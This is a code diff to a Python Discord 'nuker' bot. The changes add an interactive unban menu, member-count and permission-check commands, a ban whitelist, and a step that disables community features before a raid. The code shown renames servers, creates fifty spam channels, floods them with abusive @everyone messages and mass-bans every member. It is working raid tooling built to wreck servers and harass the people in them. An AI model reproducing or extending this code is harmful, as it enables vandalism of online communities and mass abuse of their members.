@@ -11,6 +11,7 @@ import colorama
 from colorama import Fore, Style, init
 
 
+
 def install_requirements_if_needed():
     """Check if requirements are installed, and install them if they're not."""
     try:
@@ -109,7 +110,7 @@ async def on_ready():
             " 4. Commands              5. Servers             6. Change Bot Token"
         )
         print(" ")
-        print(Fore.RED + " 7. Generate server invite ")
+        print(Fore.RED + " 7. Gen server invite     8. Unban User")
         print(" ")
 
         choice = await async_input(Fore.RED + "user@ArcV1/~  ")
@@ -219,6 +220,8 @@ async def on_ready():
             print(Fore.RED + "$ban - bans every member (it can)")
             print(Fore.RED + "$admin - gives you the highest role (it can)")
             print(Fore.RED + "$create - creates a channel (example: $create chat")
+            print(Fore.RED + "$members - shows all members")
+            print(Fore.RED + "$perms - show the permissions it has")
             time.sleep(3.5901086)
             os.system('cls' if os.name == 'nt' else 'clear')
         elif choice == '5':
@@ -257,6 +260,35 @@ async def on_ready():
                 print(Fore.RED + "[-] The bot is not in any guilds.")
             time.sleep(5)  # Wait for 5 seconds before clearing the screen
             os.system('cls' if os.name == 'nt' else 'clear')
+        elif choice == '8':
+                        # Ask for the guild ID
+                        guild_id = input("Enter the guild ID: ")
+                        try:
+                            guild_id = int(guild_id)
+                            guild = bot.get_guild(guild_id)
+
+                            if guild is None:
+                                print(f"[-] Guild with ID '{guild_id}' not found.")
+                                continue
+
+                            user_id = input("Enter the user ID to unban: ")
+                            try:
+                                user_id = int(user_id)
+                                banned_users = await guild.bans()  # Fetch bans list
+                                if any(banned_user.user.id == user_id for banned_user in banned_users):
+                                    user = discord.Object(id=user_id)
+                                    await guild.unban(user)  # Unban the user
+                                    print(f" [+] Unbanned user with ID {user_id} in guild: {guild.name}")
+                                else:
+                                    print(f" [-] User ID {user_id} is not banned in guild: {guild.name}")
+                            except ValueError:
+                                print("[-] Please enter a valid user ID.")
+                            except discord.Forbidden:
+                                print(f"[-] I do not have permission to unban users in guild: {guild.name}")
+                            except discord.HTTPException as e:
+                                print(f"[-] Failed to unban user with ID {user_id} in guild: {guild.name}. Error: {e}")
+                        except ValueError:
+                            print("[-] Please enter a valid guild ID.")
 
         else:
             print(Fore.RED + "Invalid choice.")
@@ -277,7 +309,7 @@ async def perform_nuke(guild):
 
     new_channels = []
     for i in range(50):
-        await guild.edit(name='SERVER-NUKED-BY-VYXLOL')
+        await guild.edit(name='SERVER NUKED BY VYXLOL')
         channel = await guild.create_text_channel(f'NUKED-LOL')
         new_channels.append(channel)
 
@@ -286,7 +318,7 @@ async def perform_nuke(guild):
             await channel.send(f'@everyone I RUN YOU BITCH')
             await channel.send(f' @everyone LOL GET NUKED')
             await channel.send(
-                f'@everyone raided by daddy vyx909 (https://github.com/vyx909/DscNuker)'
+                f'@everyone raided by daddy vyx909 (https://www.youtube.com/@vxcnlol)'
             )
             await asyncio.sleep(0)
 
@@ -301,9 +333,15 @@ async def perform_nuke(guild):
 
 
 @bot.command()
+@commands.has_permissions(manage_guild=True)  # Ensure the user has permission to manage the guild
 async def nuke(ctx):
     guild = ctx.guild
-    await perform_nuke(guild)
+
+    # Disable community features if they are enabled
+    if guild.features and 'COMMUNITY' in guild.features:
+        await guild.edit(community=False)  # Disable community features
+
+    await perform_nuke(guild)  # Call your nuke function
     await ctx.send("[+] Nuke operation completed!")
 
 
@@ -391,10 +429,12 @@ async def create(ctx, *, name: str):
 @bot.command()
 @commands.has_permissions(ban_members=True)  # Ensure the user has permission to ban members
 async def ban(ctx):
+    # Define a list of user IDs that should not be banned
+    noban_ids = [962135062638387242, 987654321098765432]  # Replace these with the actual user IDs you want to exclude
 
     # Iterate through all members in the server
     for member in ctx.guild.members:
-        if member != ctx.guild.me:  # Prevent the bot from banning itself
+        if member.id not in noban_ids and member != ctx.guild.me:  # Prevent the bot from banning itself and excluded users
             try:
                 await member.ban(reason="LOL")
                 print(f" [+] Banned {member.name}#{member.discriminator} for reason: LOL")
@@ -404,7 +444,51 @@ async def ban(ctx):
                 print(f"[-] Failed to ban {member.name}#{member.discriminator}: {e}")
 
     
+@bot.command()
+async def members(ctx):
+    # Get the total number of members in the server
+    total_members = ctx.guild.member_count
 
+    # Send a message to the channel with the total member count
+    await ctx.send(f'The total number of members in this server is: {total_members}')
+
+@bot.command()
+async def perms(ctx):
+    # Get the bot's permissions in the current channel
+    bot_permissions = ctx.channel.permissions_for(ctx.guild.me)
+
+    # Create a list to hold the permissions and their statuses
+    permissions_list = []
+
+    # Check for specific permissions and add them to the list with their status
+    permissions_list.append(f"Admin: {'✅' if bot_permissions.administrator else '❌'}")
+    permissions_list.append(f"Kick: {'✅' if bot_permissions.kick_members else '❌'}")
+    permissions_list.append(f"Ban: {'✅' if bot_permissions.ban_members else '❌'}")
+    permissions_list.append(f"Manage Server: {'✅' if bot_permissions.manage_guild else '❌'}")
+
+    # Create a message with the list of permissions
+    permissions_message = "The bot has the following permissions:\n" + "\n".join(permissions_list)
+
+    # Send the message
+    message = await ctx.send(permissions_message)
+
+    # Wait for 3 seconds
+    await asyncio.sleep(3)
+
+    # Delete the message
+    await message.delete()
+
+
+@bot.command()
+@commands.has_permissions(manage_guild=True)  # Ensure the user has permission to manage the guild
+async def discommunity(ctx):
+    guild = ctx.guild
+    # Check if the guild is a community server
+    if guild.features and 'COMMUNITY' in guild.features:
+        await guild.edit(community=False)  # Disable community features
+        # No message is sent after disabling
+    # Optionally, you can log this action to the console
+    print(f"Community features disabled for {guild.name}")
 
 token_file = "token.txt"  # Name of the token file
 if not os.path.exists(token_file):
